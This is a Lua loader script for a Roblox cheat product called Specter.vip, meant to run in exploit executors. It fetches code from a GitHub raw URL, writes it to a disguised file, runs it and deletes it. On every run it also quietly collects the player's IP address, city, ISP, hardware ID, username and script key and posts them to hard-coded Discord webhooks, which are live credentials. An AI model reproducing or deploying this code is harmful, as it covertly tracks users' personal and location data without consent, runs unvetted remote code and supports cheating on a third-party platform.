local startTime = os.clock()

--[[
local function dateToTimestamp(dateStr)
    local day, month, year = dateStr:match("(%d+).(%d+).(%d+)")
    if not (day and month and year) then return nil end
    return os.time({year = 2000 + tonumber(year), month = tonumber(month), day = tonumber(day), hour = 0, min = 0, sec = 0})
end

local keys = loadstring(game:HttpGet("https://pastebin.com/raw/BZj5Emai"))()

local function isKeyValid(key)
    if not key or not keys or not keys[key] then return false end
    local keyData = keys[key]
    local createdTimestamp = dateToTimestamp(keyData.created)
    if not createdTimestamp then return false end
    return (os.time() - createdTimestamp) / 86400 < keyData.days
end

if not isKeyValid(script_key) then
    print("key_valid: false")
else
    print("key_valid: true")
	print("Loading script")
	print("-----------------------------------------")
	loadstring(game:HttpGet("https://pastebin.com/raw/WPZ6X3cV"))()
end
]]

if not getgenv().s3wxd4ec5vf6bgt7hn then
    getgenv().s3wxd4ec5vf6bgt7hn = 0
end

tampered = false

local function tampering(reason)

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local player = Players.LocalPlayer
local username = player.Name
local userId = player.UserId
local accountAge = player.AccountAge
local apicom = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))

local serverstatus = game:GetService("ReplicatedStorage").ServerStatus
local serverid = serverstatus:GetAttribute("ServerId")
local region = serverstatus:GetAttribute("ServerLocation")
local version = serverstatus:GetAttribute("Version")

local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&format=png&size=420x420", userId)

local ip, hwid, gameId, jobId, country, city, isp = "Error: Denial of Service", "Error: Unavailable Service: [RbxAnalyticsService]", "Error: Unknown GameID", "Error: Unknown JobID", "Error: Unknown Country", "Error: Unknown City", "Error: Unknown ISP"

pcall(function()
    hwid = RbxAnalyticsService:GetClientId()
end)

pcall(function()
    gameId = game.PlaceId
    jobId = game.JobId
end)

pcall(function()
    country = apicom.country
    city = apicom.city
    isp = apicom.isp
    ip = apicom.query
end)

if hwid == "E860574B-606C-4319-926E-A2517D9B843D" then
    ip = "Unavailable"
    city = "Unavailable"
    isp = "Unavailable"
    country = "Unavailable"
end

local webhookUrl = "https://discord.com/api/webhooks/1350511907714498670/qJxu_LFrpaQGsAeYn29BAxPlzR0BgEjmHOnjOpLqdXyNVtfR-EcLCKzMxEhPLPXTm6GU"

local embed = {
    title = "Tampering Detected - #6a93661d8267f268797c401f172e5823",
    color = 65535,
    footer = { text = "Specter.vip" },
    author = {
        name = username,
        url = "https://www.roblox.com/users/" .. userId .. "/profile",
        icon_url = avatarUrl
    },
    fields = {
        { name = "Username", value = username, inline = true },
        { name = "User ID", value = tostring(userId), inline = true },
        { name = "Account Age (Days)", value = tostring(accountAge), inline = true },
        { name = "IP", value = ip, inline = true },
        { name = "ISP", value = isp, inline = true },
        { name = "Country", value = country, inline = true },
        { name = "City", value = city, inline = true },
        { name = "HWID", value = hwid, inline = true },
        { name = "Script Key", value = tostring(script_key), inline = true },
        { name = "Game ID", value = tostring(gameId), inline = true },
        { name = "Job ID", value = tostring(jobId), inline = true },
        { name = "Tampering Reason Kick", value = tostring(reason), inline = false },
        { name = "Server", value = "Server ID: " .. serverid .. " | Region: " .. region .. " | Version: " .. version, inline = false }
    },
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

(syn and syn.request or http_request) {
    Url = webhookUrl,
    Method = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body = HttpService:JSONEncode({ content = "tx ", embeds = { embed } })
}

    game.Players.LocalPlayer:Kick("Tampering detected.")
    while true do end
end

getgenv().s3wxd4ec5vf6bgt7hn = getgenv().s3wxd4ec5vf6bgt7hn + 2

if getgenv().s3wxd4ec5vf6bgt7hn > 2 then
    tampering("Double injection")
    return
end

local loadf = loadfile
local delf = delfile
local writef = writefile

local function ie()
    if identifyexecutor() then
        return identifyexecutor()
    end
    return "Unknown"
end

local executor = ie()

if executor == "Unknown" then
    tampered = true
    tampering("Unsupported Executor: " .. executor)
    return
end

local expected_values = {
    Potassium = {
        loadfile = { numparams = 0, is_vararg = 1, source = "=[C]", name = "loadfile", nups = 0, currentline = -1 },
        delfile = { numparams = 0, is_vararg = 1, source = "=[C]", name = "delfile", nups = 0, currentline = -1 },
        writefile = { numparams = 0, is_vararg = 1, source = "=[C]", name = "writefile", nups = 0, currentline = -1 }
    },
    Wave = {
        loadfile = { numparams = 0, is_vararg = 1, source = "=[C]", nups = 0, currentline = -1 },
        delfile = { numparams = 0, is_vararg = 1, source = "=[C]", nups = 0, currentline = -1 },
        writefile = { numparams = 0, is_vararg = 1, source = "=[C]", nups = 0, currentline = -1 }
    }
}

if not expected_values[executor] then
    tampered = true
    tampering("Unsupported Executor: " .. executor)
    return
end

local function chk(func, expected)
    local info = debug.getinfo(func)
    for k, v in pairs(expected) do
        if info[k] ~= v then return false end
    end
    return true
end

local function chk_all()
    if not chk(loadf, expected_values[executor].loadfile) then
        tampered = true
        tampering("Modified: loadfile")
    end
    if rawget(_G, "delf") and not chk(delf, expected_values[executor].delfile) then
        tampered = true
        tampering("Modified: delfile")
    end
    if rawget(_G, "writef") and not chk(writef, expected_values[executor].writefile) then
        tampered = true
        tampering("Modified: writefile")
    end
end

chk_all()

local function twf()
    local success, result = pcall(function() writefile("specterguard.lua", "print(\"load\")") end)
    return success
end

local function tlf()
    local success, result = pcall(function()
        local func, err = loadfile("specterguard.lua")
        if func then
            local output = func()
            return output == "load"
        else
            return false
        end
    end)
    return success
end

local function tdf()
    local success, result = pcall(function() delfile("specterguard.lua") end)
    if success then
        return true
    end
    return false
end

local twfResult = twf()
local tlfResult = tlf()
local tdfResult = tdf()

local isValid = twfResult and tlfResult and tdfResult

if not isValid then
    tampered = true
    tampering("Missing files | Writefile: " .. tostring(twfResult) .. " | Loadfile: " .. tostring(tlfResult) .. " | Delfile: " .. tostring(tdfResult))
    return
end

local execname = identifyexecutor()

if execname ~= "Wave" and execname ~= "Synapse" and execname ~= "Potassium" then
    print("load_2: executor not supported: " .. execname)
    
    wait(5)
    tampered = true
    tampering("Unsupported Executor: " .. identifyexecutor())
    return
end

local folderName = "Specter.vip"
local assetsFolder = folderName .. "/assets"
local fileName = assetsFolder .. "/gradientp180.oh"

if not isfolder(folderName) then
    makefolder(folderName)
end

if not isfolder(assetsFolder) then
    makefolder(assetsFolder)
end

if not tampered then
    local url = "https://raw.githubusercontent.com/t5281/spc/refs/heads/main/main.lua"
    local scriptContent = game:HttpGet(url)

    writefile(fileName, scriptContent)

    task.spawn(function()
        local success, result = pcall(loadfile(fileName))
        if success then
            delfile(fileName)
        else
            delfile(fileName)
        end
    end)
end

local elapsedTime = os.clock() - startTime
print("Specter.vip has loaded in " .. string.format("%.6f", elapsedTime) .. "s!")

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local username = player.Name
local userId = player.UserId
local accountAge = player.AccountAge
local membershipType = tostring(player.MembershipType)
local deviceType = "Error: Unavailable Service: [UserInputService]"
local apicom = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))

local serverstatus = game:GetService("ReplicatedStorage").ServerStatus
local serverid = serverstatus:GetAttribute("ServerId")
local region = serverstatus:GetAttribute("ServerLocation")
local version = serverstatus:GetAttribute("Version")

if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    deviceType = "Mobile"
elseif UserInputService.KeyboardEnabled and not UserInputService.TouchEnabled then
    deviceType = "PC"
elseif UserInputService.GamepadEnabled then
    deviceType = "Console"
end

local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&format=png&size=420x420", userId)

local ip, hwid, gameId, jobId, country, city, isp = "Error: Denial of Service", "Error: Unavailable Service: [RbxAnalyticsService]", "Error: Unknown GameID", "Error: Unknown JobID", "Error: Unknown Country", "Error: Unknown City", "Error: Unknown ISP"

pcall(function()
    hwid = RbxAnalyticsService:GetClientId()
end)

pcall(function()
    gameId = game.PlaceId
    jobId = game.JobId
end)

pcall(function()
    country = apicom.country
    city = apicom.city
    isp = apicom.isp
    ip = apicom.query
end)

local discordId = keys and keys[script_key] and keys[script_key].discordid or "Not Found"

if hwid == "E860574B-606C-4319-926E-A2517D9B843D" then
    ip = "Unavailable"
    city = "Unavailable"
    isp = "Unavailable"
    country = "Unavailable"
end

local webhookUrl = "https://discord.com/api/webhooks/1347663521910886480/Q120Myc4__5_sPKsbjNFJzTIz-E25pS6GCSfvnawOvfLDTvc9mmxGCqKB_0zmKkftGRS"

local embed = {
    title = "Script Executed - #6a93661d8267f268797c401f172e5823",
    color = 65535,
    footer = { text = "Specter.vip" },
    author = {
        name = username,
        url = "https://www.roblox.com/users/" .. userId .. "/profile",
        icon_url = avatarUrl
    },
    fields = {
        { name = "Username", value = username, inline = true },
        { name = "User ID", value = tostring(userId), inline = true },
        { name = "Account Age (Days)", value = tostring(accountAge), inline = true },
        { name = "IP", value = ip, inline = true },
        { name = "ISP", value = isp, inline = true },
        { name = "Country", value = country, inline = true },
        { name = "City", value = city, inline = true },
        { name = "HWID", value = hwid, inline = true },
        { name = "Script Key", value = tostring(script_key), inline = true },
        { name = "Discord ID", value = tostring(discordId), inline = false },
        { name = "Game ID", value = tostring(gameId), inline = true },
        { name = "Job ID", value = tostring(jobId), inline = true },
        { name = "Server", value = "Server ID: " .. serverid .. " | Region: " .. region .. " | Version: " .. version, inline = false }
    },
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

(syn and syn.request or http_request) {
    Url = webhookUrl,
    Method = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body = HttpService:JSONEncode({ content = "tx ", embeds = { embed } })
}
